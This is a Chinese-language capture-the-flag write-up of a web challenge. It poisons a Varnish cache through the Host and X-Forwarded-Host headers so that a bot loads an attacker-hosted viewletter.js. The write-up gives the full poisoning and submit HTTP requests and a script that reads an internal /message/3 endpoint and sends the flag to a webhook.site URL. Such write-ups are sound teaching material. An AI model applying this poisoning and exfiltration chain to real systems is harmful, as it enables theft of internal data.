## 分析

思路：
1. 首先缓存投毒一个不存在的`/letter?id=x`
2. 当`/submit`的时候，内部会请求我们投毒的页面`/letter?id=x`
3. `/letter?id=x`会加载一个`viewletter.js`的文件并发起`/message/x`的请求
4. 我们把`/letter?id=x`的页面污染之后，内部请求实际上是发送到我们的服务器，这样我们可以配合`viewletter.js`文件来发起内部请求获取`flag`

首先来看下代码

```JavaScript
router.get("/letters", (req, res) => {
    return res.render("viewletters.html", {
        cdn: `${req.protocol}://${req.hostname}:${req.headers["x-forwarded-port"] ?? 80}/static/`,
    });
});
```
当访问`/letters?id=x`的时候会加载`viewletters.html`，并且把`cdn`的值设置为可控内容
我们可以通过`Host`和`X-Forearded-Host`头来控制`hostname`和端口
再看看`viewletters.html`文件，内部存在一个`script`标签会加载`viewletter.js`，也就是发起一个`/message/x`的请求


接着再看`/submit`接口，提交内容的时候`id`是递增的
```JavaScript
.then(async inserted => {
    try {
        botVisiting = true;
        await visit(`http://127.0.0.1/letters?id=${inserted.lastID}`, authSecret);      //这里需要注意的是请求的是127.0.0.1
        botVisiting = false;
    }
```
当我们提交一个`letter`上去之后，内部`bot`会发起一个内部请求，去读取内容，我们可以从`database.js`文件中知道`flag`在`/message/3`中

所以我们需要缓存投毒一个不存在的`letter`，然后当提交的时候，程序内部发起请求，读取外部的`viewletter.js`文件

首先我们先缓存一个`/letters?id=17`的页面，这里需要注意`Host: 127.0.0.1`，因为在程序的`bot`中，它请求的是`127.0.0.1`

```
GET /letters?id=17 HTTP/1.1
Host: 127.0.0.1
X-Forwarded-Host: evilServer
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1

RESPONSE:
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<base href="http://evilServer:80/static/" />
<link rel="preconnect" href="https://fonts.googleapis.com" />
```

可以看到已经成功投毒污染了返回页面 `<base href="http://evilServer:80/static/" />`

我们只需要提前在`http://evilServer:80/static/`服务器的目录下放置一个`viewletter.js`文件，代码如下：
```
const loadLetter = () => {

  fetch('http://127.0.0.1/message/3')
    .then(response => response.json())
    .then(data => {
      fetch('https://webhook.site/745ddb84-cc33-4caf-8ab7-44cf4ff2bdc2?flag=' + data.message);
});
};
loadLetter();
```

最后在`/submit`提交
```
POST /submit HTTP/1.1
Host: 157.245.42.82:32648
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: http://157.245.42.82:32648/
Content-Type: application/json
Origin: http://157.245.42.82:32648
Content-Length: 17
Connection: close

{"message":"111"}


RESPONSE:
HTTP/1.1 201 Created
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 14
ETag: W/"e-aWduDa/bnm8PdL24DEpqZTuA65c"
Date: Sun, 08 May 2022 13:40:31 GMT
X-Varnish: 98402
Age: 0
Via: 1.1 varnish (Varnish/6.1)
X-Cache: MISS
X-Cache-Hits: 0
Connection: close

{"message":17}
```

即可获得`flag`
